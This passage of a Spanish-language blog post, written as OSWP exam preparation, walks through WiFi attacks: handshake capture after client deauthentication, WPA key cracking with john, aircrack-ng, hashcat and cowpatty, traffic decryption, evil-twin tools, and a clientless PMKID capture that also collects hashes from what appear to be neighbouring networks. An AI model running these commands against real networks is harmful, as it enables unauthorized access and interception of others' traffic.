34303 184.505328 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, SN=3135, FN=0, Flags=....R...
34304 184.505888 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, SN=3135, FN=0, Flags=....R...
34305 184.506479 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, SN=3135, FN=0, Flags=....R...
34306 184.507047 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, SN=3135, FN=0, Flags=....R...
34307 184.507682 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, SN=3135, FN=0, Flags=....R...
34308 184.508256 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, SN=3135, FN=0, Flags=....R...
34309 184.508876 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, SN=3135, FN=0, Flags=....R...
34310 184.509440 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, SN=3135, FN=0, Flags=....R...
37955 193.360020 1a:58:18:4e:8a:68 → c6:bf:fd:55:e2:f7 802.11 65 Authentication, SN=2395, FN=0, Flags=........
37957 193.369268 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, SN=3142, FN=0, Flags=........
```

De esta forma filtramos por los paquetes de **Deauthentication** 

```bash
❯ tshark -r Captura-01.cap -Y "wlan.fc.type_subtype==12" 2>/dev/null | tail -n 10
37924 191.278041 c6:bf:fd:55:e2:f7 → Broadcast    802.11 26 Deauthentication, SN=1012, FN=0, Flags=........
37925 191.280473    Broadcast → c6:bf:fd:55:e2:f7 802.11 26 Deauthentication, SN=1013, FN=0, Flags=........
37926 191.281691 c6:bf:fd:55:e2:f7 → Broadcast    802.11 26 Deauthentication, SN=1012, FN=0, Flags=........
37927 191.282669    Broadcast → c6:bf:fd:55:e2:f7 802.11 26 Deauthentication, SN=1013, FN=0, Flags=........
37929 191.283940 c6:bf:fd:55:e2:f7 → Broadcast    802.11 26 Deauthentication, SN=1014, FN=0, Flags=........
37930 191.285588 c6:bf:fd:55:e2:f7 → Broadcast    802.11 26 Deauthentication, SN=1014, FN=0, Flags=........
37931 191.286318    Broadcast → c6:bf:fd:55:e2:f7 802.11 26 Deauthentication, SN=1015, FN=0, Flags=........
37933 191.290187 c6:bf:fd:55:e2:f7 → Broadcast    802.11 26 Deauthentication, SN=1016, FN=0, Flags=........
37934 191.290197    Broadcast → c6:bf:fd:55:e2:f7 802.11 26 Deauthentication, SN=1015, FN=0, Flags=........
37935 191.293178 c6:bf:fd:55:e2:f7 → Broadcast    802.11 26 Deauthentication, SN=1016, FN=0, Flags=........
```

Este es para filtrar por los paquetes de tipo **Disassociate**

```bash
❯ tshark -r Captura-01.cap -Y "wlan.fc.type_subtype==10" 2>/dev/null
 9879 137.777670 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 26 Disassociate, SN=3092, FN=0, Flags=........
 9880 137.778488 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 26 Disassociate, SN=3092, FN=0, Flags=....R...
 9881 137.779021 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 26 Disassociate, SN=3092, FN=0, Flags=....R...
 9882 137.779431 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 26 Disassociate, SN=3092, FN=0, Flags=....R...
 9883 137.780339 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 26 Disassociate, SN=3092, FN=0, Flags=....R...
```

Este es para filtrar por los **ACK** este paquete se utiliza para confirmar que se ah recibido con éxito un segmento de datos

```bash
❯ tshark -r Captura-01.cap -Y "wlan.fc.type_subtype==29" 2>/dev/null | tail -n 5
39650 241.336497              → c6:bf:fd:55:e2:f7 (c6:bf:fd:55:e2:f7) (RA) 802.11 10 Acknowledgement, Flags=........
39652 241.352849              → 1a:58:18:4e:8a:68 (1a:58:18:4e:8a:68) (RA) 802.11 10 Acknowledgement, Flags=........
39656 241.673815              → Guangzho_d1:71:a4 (bc:fa:b8:d1:71:a4) (RA) 802.11 10 Acknowledgement, Flags=........
39658 241.735049              → Guangzho_d1:71:a4 (bc:fa:b8:d1:71:a4) (RA) 802.11 10 Acknowledgement, Flags=........
39660 241.995757              → HonHaiPr_48:6c:cf (84:4b:f5:48:6c:cf) (RA) 802.11 10 Acknowledgement, Flags=........
```

## Extraccion del Hash en el Handshake 

La herramienta `aircrack-ng` cuenta con un parámetro que nos va a ayudar a hacer todo esto 

```bash
❯ aircrack-ng --help | grep J
      -J <file>  : create Hashcat file (HCCAP)
```

Esto lo que hace es extraernos la información mas importante

```bash
❯ aircrack-ng -J newcap Captura-01.cap
Reading packets, please wait...
Opening Captura-01.cap
Read 39663 packets.

   #  BSSID              ESSID                     Encryption

   1  C6:BF:FD:55:E2:F7  MiguelWifi                WPA (1 handshake)

Choosing first network as target.

Reading packets, please wait...
Opening Captura-01.cap
Read 39663 packets.

1 potential targets



Building Hashcat file...

[*] ESSID (length: 10): MiguelWifi
[*] Key version: 2
[*] BSSID: C6:BF:FD:55:E2:F7
[*] STA: 1A:58:18:4E:8A:68
[*] anonce:
    72 7A C7 2C 11 C1 30 60 AA 8B 61 FD 40 8C 05 AC 
    EC A2 CF D6 F6 73 4C 56 F4 8A 2E 75 4A F5 CA D3 
[*] snonce:
    BA 4B AB 58 FC D9 87 16 2B DB BB BC A7 2B 48 7D 
    F2 DA 9B F1 5B 3E 81 0F 44 D1 B6 B6 FF E9 7E EF 
[*] Key MIC:
    1A C0 6E C3 4B B6 91 93 E0 29 04 7C BA 1C 4A 35
[*] eapol:
    02 03 00 75 02 01 0A 00 10 00 00 00 00 00 00 00 
    01 BA 4B AB 58 FC D9 87 16 2B DB BB BC A7 2B 48 
    7D F2 DA 9B F1 5B 3E 81 0F 44 D1 B6 B6 FF E9 7E 
    EF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 16 30 14 01 00 00 0F AC 04 01 00 00 0F AC 
    04 01 00 00 0F AC 02 0C 00 

Successfully written to newcap.hccap
```

Ahora con `hccap2john` le vamos a pasar la captura que creamos y lo vamos a exportar a otro archivo que hay ya va a estar el hash final con la contraseña encriptada

```bash
❯ hccap2john newcap.hccap > finalhash
```

Ahora si lo mostramos vamos a ver el **hash** de la red inlambrica

```bash
❯ cat finalhash
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: finalhash
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ MiguelWifi:$WPAPSK$MiguelWifi#lfzxJS9r4ZUMHcdciYifKDnNVlMfqviwdmh6TT9Oaz3PDc2DFB4qhjzdTixmSgQg2Q2kM8e9MTp.X.Kgv89DpjNnH
       │ 3PoWWtpGjL8ok61.5I0.Ec.2........../iYifKDnNVlMfqviwdmh6TT9Oaz3PDc2DFB4qhjzdTiw.........................................
       │ ........................3X.I.E..1uk2.E..1uk2.E..1uk01..................................................................
       │ .................................................................................................................../t..
       │ ...U.../f.PgB9hd4Hs0Y2T9cQGXI:1a58184e8a68:c6bffd55e2f7:c6bffd55e2f7::WPA2:newcap.hccap
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

# Fuerza bruta con John 

Para crackearla contraseña es muy fácil simplemente hacemos esto en mi caso usare el `rockyou.txt` ya que la contraseña esta en el diccionario

```bash
❯ john -w:/usr/share/wordlists/rockyou.txt finalhash
Warning: detected hash type "wpapsk", but the string is also recognized as "wpapsk-pmk"
Use the "--format=wpapsk-pmk" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (wpapsk, WPA/WPA2/PMF/PMKID PSK [PBKDF2-SHA1 512/512 AVX512BW 16x])
Cost 1 (key version [0:PMKID 1:WPA 2:WPA2 3:802.11w]) is 2 for all loaded hashes
Will run 2 OpenMP threads
Note: Minimum length forced to 2 by format
Press 'q' or Ctrl-C to abort, almost any other key for status
manchester       (MiguelWifi)
1g 0:00:00:00 DONE (2023-09-12 18:45) 3.125g/s 1600p/s 1600c/s 1600C/s jeffrey..letmein
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

# Fuerza bruta con aircrack-ng 

Bueno también se puede hacer usando la propia herramienta `aircrack-ng`

```bash
❯ aircrack-ng -w /usr/share/wordlists/rockyou.txt Captura-01.cap
```

```bash

                               Aircrack-ng 1.6 

      [00:00:01] 435/10303727 keys tested (587.39 k/s) 

      Time left: 4 hours, 52 minutes, 20 seconds                 0.00%

                          KEY FOUND! [ manchester ]


      Master Key     : 55 01 AE 01 39 05 DF 0B 58 9B EF 29 56 27 80 10 
                       E0 DE D9 00 AD E5 62 96 0C 59 9B 1E 4A 0E B5 B7 

      Transient Key  : 40 2F 55 3D 19 28 BD 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

      EAPOL HMAC     : 1A C0 6E C3 4B B6 91 93 E0 29 04 7C BA 1C 4A 35 
```

# Fuerza bruta con Hashcat

Ahora lo haremos con **Hashcat**

```bash 
❯ hashcat -h | grep -i wpa
   2500 | WPA-EAPOL-PBKDF2                                 | Network Protocols
   2501 | WPA-EAPOL-PMK                                    | Network Protocols
  22000 | WPA-PBKDF2-PMKID+EAPOL                           | Network Protocols
  22001 | WPA-PMK-PMKID+EAPOL                              | Network Protocols
  16800 | WPA-PMKID-PBKDF2                                 | Network Protocols
  16801 | WPA-PMKID-PMK      
```

La herramienta `aircrack-ng` cuenta con un parámetro para crear un archivo donde este el **hash** y `aircrack-ng` lo pueda **crackear**

```bash
❯ aircrack-ng --help | grep j | tail -n 1
      -j <file>  : create Hashcat v3.6+ file (HCCAPX)
```

```bash
❯ aircrack-ng -j hashcap Captura-01.cap
Reading packets, please wait...
Opening Captura-01.cap
Read 39663 packets.

   #  BSSID              ESSID                     Encryption

   1  C6:BF:FD:55:E2:F7  MiguelWifi                WPA (1 handshake)

Choosing first network as target.

Reading packets, please wait...
Opening Captura-01.cap
Read 39663 packets.

1 potential targets



Building Hashcat (3.60+) file...

[*] ESSID (length: 10): MiguelWifi
[*] Key version: 2
[*] BSSID: C6:BF:FD:55:E2:F7
[*] STA: 1A:58:18:4E:8A:68
[*] anonce:
    72 7A C7 2C 11 C1 30 60 AA 8B 61 FD 40 8C 05 AC 
    EC A2 CF D6 F6 73 4C 56 F4 8A 2E 75 4A F5 CA D3 
[*] snonce:
    BA 4B AB 58 FC D9 87 16 2B DB BB BC A7 2B 48 7D 
    F2 DA 9B F1 5B 3E 81 0F 44 D1 B6 B6 FF E9 7E EF 
[*] Key MIC:
    1A C0 6E C3 4B B6 91 93 E0 29 04 7C BA 1C 4A 35
[*] eapol:
    02 03 00 75 02 01 0A 00 10 00 00 00 00 00 00 00 
    01 BA 4B AB 58 FC D9 87 16 2B DB BB BC A7 2B 48 
    7D F2 DA 9B F1 5B 3E 81 0F 44 D1 B6 B6 FF E9 7E 
    EF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 16 30 14 01 00 00 0F AC 04 01 00 00 0F AC 
    04 01 00 00 0F AC 02 0C 00 

Successfully written to hashcap.hccapx
```

Y ahora simplemente le indicamos el modo y el archivo

```bash
❯ hashcat -m 2500 -d 1 hashcap.hccapx /usr/share/wordlists/rockyou.txt --force
hashcat (v6.1.1) starting...

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.
OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-1035G1 CPU @ 1.00GHz, 2855/2919 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 8
Maximum password length supported by kernel: 63

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 64 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 3 secs

c6bffd55e2f7:1a58184e8a68:MiguelWifi:manchester  
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: WPA-EAPOL-PBKDF2
Hash.Target......: MiguelWifi (AP:c6:bf:fd:55:e2:f7 STA:1a:58:18:4e:8a:68)
Time.Started.....: Tue Sep 12 19:02:01 2023, (1 sec)
Time.Estimated...: Tue Sep 12 19:02:02 2023, (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     2044 H/s (7.15ms) @ Accel:1024 Loops:128 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests
Progress.........: 6595/14344385 (0.05%)
Rejected.........: 4547/6595 (68.95%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456789 -> zaq12wsx

Started: Tue Sep 12 19:01:04 2023
Stopped: Tue Sep 12 19:02:03 2023
```

# Cracking cowpatty

Estas es otra alternativa

```bash
❯ cowpatty -f /usr/share/wordlists/rockyou.txt -r Captura-01.cap -s MiguelWifi
cowpatty 4.8 - WPA-PSK dictionary attack. <jwright@hasborg.com>

Collected all necessary data to mount crack against WPA2/PSK passphrase.
Starting dictionary attack.  Please be patient.

The PSK is "manchester".

128 passphrases tested in 0.27 seconds:  465.61 passphrases/second
```

## Espionaje 

Bueno para poder entender todo esto vamos a comenzar capturando un **handshake**

Vamos a ponernos otra vez monitoreando el **AP** y lo vamos a exportar a un fichero

```bash
❯ airodump-ng -w Captura --bssid C6:BF:FD:55:E2:F7 --channel 1 wlan0mon 
```

Hay vemos otra vez que hay un cliente 

![](/assets/images/hacking-writeup-wifi/xd.png)

Ahora vamos a expulsar al cliente de la red y esperamos a que se reconecte para obtener el **Handshake** en este caso voy a indicar la **MAC** del cliente para que mas rapido

```bash
❯ aireplay-ng -0 0 -e MiguelWifi -c 84:4B:F5:48:6C:CF wlan0mon
```

![](/assets/images/hacking-writeup-wifi/xd1.png)

Si seguimos en escucha y desde el lado del cliente nos autenticamos a alguna pagina como **facebook.com** u alguna otra pensaremos que podríamos ver el trafico **http** y la respuesta es si se puede pero como va encriptado no podemos ver los paquetes para ver todo esto debes de generar un **handshake** previamente

Pero para desencriptar una captura en base a una contraseña que proporciones

```bash
❯ airdecap-ng --help

  Airdecap-ng 1.6  - (C) 2006-2020 Thomas d'Otreppe
  https://www.aircrack-ng.org

  usage: airdecap-ng [options] <pcap file>

  Common options:
      -l         : don't remove the 802.11 header
      -b <bssid> : access point MAC address filter
      -e <essid> : target network SSID
      -o <fname> : output file for decrypted packets (default <src>-dec)

  WEP specific option:
      -w <key>   : target network WEP key in hex
      -c <fname> : output file for corrupted WEP packets (default <src>-bad)

  WPA specific options:
      -p <pass>  : target network WPA passphrase
      -k <pmk>   : WPA Pairwise Master Key in hex

      --help     : Displays this usage screen

  If your capture contains any WDS packet, you must specify the -b
  option (otherwise only packets destined to the AP will be decrypted)
```

Para usarla es fácil simplemente le indicamos la contraseña y la captura y como vemos se desencriptaron muchos paquetes

```bash
❯ airdecap-ng -e MiguelWifi -p manchester Captura-02.cap
Total number of stations seen           12
Total number of packets read        168309
Total number of WEP data packets         0
Total number of WPA data packets      1087
Number of plaintext data packets         0
Number of decrypted WEP  packets         0
Number of corrupted WEP  packets         0
Number of decrypted WPA  packets       855
Number of bad TKIP (WPA) packets         0
Number of bad CCMP (WPA) packets         0
```

Esto nos crea una nueva captura llamada **Captura-02-dec.cap** vemos que se emitio una respuesta que es de donde me intente conectar y dijo que la cuenta no existía

```bash
❯ tshark -r Captura-02-dec.cap -Y "http" 2>/dev/null
    1   0.000000 142.250.177.3 → 192.168.43.202 OCSP 779 Response
```

Y de esta forma podemos ver la estructura de la data 

```bash
❯ tshark -r Captura-03-dec.cap -Y "http" -Tfields -e tcp.payload 2>/dev/null | xxd -ps -r
HTTP/1.1 200 OK
Server: scaffolding on HTTPServer2
Content-Length: 472
X-XSS-Protection: 0
X-Frame-Options: SAMEORIGIN
Date: Wed, 13 Sep 2023 01:42:59 GMT
Cache-Control: public, max-age=14400
Content-Type: application/ocsp-response
Age: 2054

0
0	*H00%W*]S20230912234636Z0t0r0J0	+PSCIA]e7nHcZ%W*]SX7/#g20230912234636Z20230919224635Z0
`!'vL)*ETOCZ),ź*bK72\QkļPxhT-+,:gq0aqs+gGaMXԚ"io*H^r^M>м	E!gG$d#bg/n"jL@cu琲hnNoRjͩõM"c^k_#ѿm1#
```

En dado caso si quisiéramos ver algo mas como el usuario y la contraseña de alguna pagina web donde se conecte el cliente podemos hacerlo simplemente es seguir en escuchar y hacer los mismos procesos en este caso yo no lo voy a hacer por que estoy fue a modo de ejemplo

## Evil Twin Attack 

Este ataque nos permite obtener la contraseña de la red inalambrica pero de forma alternativa vamos a crear una **fake** **AP** que opere en el mismo canal para que el cliente se conecte al de nosotros usando una plantilla este ataque se puede hacer tanto manual como automatizado con alguna herramienta recomiendo estas <https://github.com/D3Ext/WEF> y <https://github.com/s4vitar/evilTrust>

Una vez instalada la herramienta tenemos estos parámetros aqui te dejo un **POST** del propio creador de la herramienta <https://d3ext.github.io/posts/Curso/#ataque-evil-twin>

```bash
❯ wef -h
 __      _____ ___ 
 \ \    / / __| __|
  \ \/\/ /| _|| _| 
   \_/\_/ |___|_|  

[WEF] Wi-Fi Exploitation Framework 1.2

[*] Interfaces:
	br-9deedf958a2c
	docker0
	ens33

Required parameters:
	-i, --interface) 	The name of your network card interface in managed mode

Optional parameters:
	-v, --verbose) 		Show more info during the attacks (recommended)
	-h, --help) 		Show this help panel
	--version) 		Print the version and exit
	-s) 			Set tool language to spanish
```

- Si quieres aprender a hacerlo manual puedes ver los pasos aquí <https://s4vitar.github.io/oswp-preparacion/#>

>En algunos casos el **Fake AP** no va hacer estable ya que `airbase-ng` no genera puntos de acceso estables y usar una antena **Alfa** funciona por eso se usan mucho las herramientas automatizadas

## Ataques a redes sin clientes 

Para este ataque no es necesario que allá clientes conectados al **AP** lo primero que vamos a hacer es usar `hcxdumptool` este ataque es muy fácil y rápido

```bash
❯ hcxdumptool -i wlan0mon -o hola --enable_status=1
initialization...
warning: wlan0mon is probably a monitor interface
interface is already in monitor mode

start capturing (stop with ctrl+c)
NMEA 0183 SENTENCE........: N/A
INTERFACE NAME............: wlan0mon
INTERFACE HARDWARE MAC....: 9cefd5f91ec0
DRIVER....................: rt2800usb
DRIVER VERSION............: 6.1.0-1parrot1-amd64
DRIVER FIRMWARE VERSION...: 0.36
ERRORMAX..................: 100 errors
BPF code blocks...........: 0
FILTERLIST ACCESS POINT...: 0 entries
FILTERLIST CLIENT.........: 0 entries
FILTERMODE................: unused
WEAK CANDIDATE............: 12345678
ESSID list................: 0 entries
ROGUE (ACCESS POINT)......: 0022f185deae (BROADCAST HIDDEN)
ROGUE (ACCESS POINT)......: 0022f100deaf (BROADCAST OPEN)
ROGUE (ACCESS POINT)......: 0022f185deb0 (incremented on every new client)
ROGUE (CLIENT)............: f04f7cd3562f
EAPOLTIMEOUT..............: 20000 usec
REPLAYCOUNT...............: 61798
ANONCE....................: b171ddef15782b90a1026d94331ce261739adc960ab501a5849af0fa067f55fe
SNONCE....................: 34858945004471ef3d78c90ad55b3f95d2d10a7110b447a2a771302496696048

04:17:08   6 f04f7cd3562f 3c7843e84d9c Total-779D_2.4Gnormal [PMKIDROGUE:230bc6e12064d4557ad6b31aba83d8a9 KDV:2]
04:17:12  11 f04f7cd3562f 2c79d7fd07fa TOTALPLAY_FD07FA [PMKIDROGUE:4765d871b51bc7605aa34180980bd6da KDV:2]
04:17:13  11 f04f7cd3562f b0b28f370c54 TOTALPLAY_370C54 [PMKIDROGUE:9fb0eff55a03d437be75455790314386 KDV:2]
04:17:36   2 f04f7cd3562f f46fed35cea8 Totalplay-2.4G-cea8 [PMKIDROGUE:2986ec13974c1c218d689a68bd90ddd3 KDV:2]
04:17:47   1 1c4d6662ad30 3ca37ea696f0 Totalplay-76AA [EAPOL:M1M2ROGUE EAPOLTIME:9985 RC:61798 KDV:2]
04:18:12  11 58e48850d938 9c9726c87d89 INFINITUMC87D89 [EAP REQUEST ID]
04:18:13  11 f04f7cd3562f b0b28f3701e1 TOTALPLAY_3701E1 [PMKIDROGUE:dfb1e61987c34c26f82a0c203bfb2ff8 KDV:2]
04:18:21  10 ec8ac43ed11e a4d4b262c37a ON_internet_2.4G_C37A [EAPOL:M1M2 EAPOLTIME:10993 RC:1 KDV:2]
04:18:21  10 ec8ac43ed11e a4d4b262c37a ON_internet_2.4G_C37A [EAPOL:M2M3 EAPOLTIME:3479 RC:2 KDV:2]
^C
terminating...
❯ 
```

Ahora usaremos `hcxpcaptool` y le daremos el nombre del archivo donde queremos que almacena los **hashes** finales

```bash
❯ hcxpcaptool -z Myhashes hola

reading from hola
                                                
summary capture file:                           
---------------------
file name........................: hola
file type........................: pcapng 1.0
file hardware information........: x86_64
capture device vendor information: 9cefd5
file os information..............: Linux 6.1.0-1parrot1-amd64
file application information.....: hcxdumptool 6.0.5 (custom options)
network type.....................: DLT_IEEE802_11_RADIO (127)
endianness.......................: little endian
read errors......................: flawless
minimum time stamp...............: 14.09.2023 10:17:07 (GMT)
maximum time stamp...............: 14.09.2023 10:18:35 (GMT)
packets inside...................: 2299
skipped damaged packets..........: 0
packets with GPS NMEA data.......: 0
packets with GPS data (JSON old).: 0
packets with FCS.................: 0
beacons (total)..................: 73
beacons (WPS info inside)........: 16
beacons (device info inside).....: 6
probe requests...................: 9
probe responses..................: 34
association requests.............: 2
association responses............: 29
reassociation responses..........: 5
authentications (OPEN SYSTEM)....: 42
authentications (BROADCOM).......: 14
EAPOL packets (total)............: 2103
EAPOL packets (WPA2).............: 2103
PMKIDs (zeroed and useless)......: 364
PMKIDs (not zeroed - total)......: 5
PMKIDs (WPA2)....................: 477
PMKIDs from access points........: 5
EAP packets......................: 2
found............................: EAP type ID
best handshakes (total)..........: 2 (ap-less: 1)
best PMKIDs (total)..............: 5

summary output file(s):
-----------------------
5 PMKID(s) written to Myhashes
```

Aquí tenemos los **hashes**

```bash
❯ cat Myhashes
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: Myhashes
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 230bc6e12064d4557ad6b31aba83d8a9*3c7843e84d9c*f04f7cd3562f*546f74616c2d373739445f322e34476e6f726d616c
   2   │ 4765d871b51bc7605aa34180980bd6da*2c79d7fd07fa*f04f7cd3562f*544f54414c504c41595f464430374641
   3   │ 9fb0eff55a03d437be75455790314386*b0b28f370c54*f04f7cd3562f*544f54414c504c41595f333730433534
   4   │ 2986ec13974c1c218d689a68bd90ddd3*f46fed35cea8*f04f7cd3562f*546f74616c706c61792d322e34472d63656138
   5   │ dfb1e61987c34c26f82a0c203bfb2ff8*b0b28f3701e1*f04f7cd3562f*544f54414c504c41595f333730314531
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Ahora usaremos **hashcat** y esperaríamos a que nos de la contraseña 

```bash
❯ hashcat -m 16800 -d 1 Myhashes /usr/share/wordlists/rockyou.txt --force
```

## Final 

- Pues bueno gracias por leer y nos vemos en el siguiente **POST** donde vamos a estar resolviendo los challenges de **WifiChallengeLab** <https://wifichallengelab.com/> para aplicar lo aprendiendo e ir preparándonos mucho mas para el **OSWP** bueno algo a saber es que el **OSWP** se sentra mas en el protocolo **WEP** que ya no se usa mucho hay ataques como el **Fake Authentication Attack**, **ARP Replay Attack**, **Chop Chop Attack**, entre otros que también tenemos que entrenar contra ese protocolo para el siguiente post también adjuntare una herramienta en **bash** para automatizar algunos ataques que hicimos hecha por mi así que gracias por leer y nos vemos
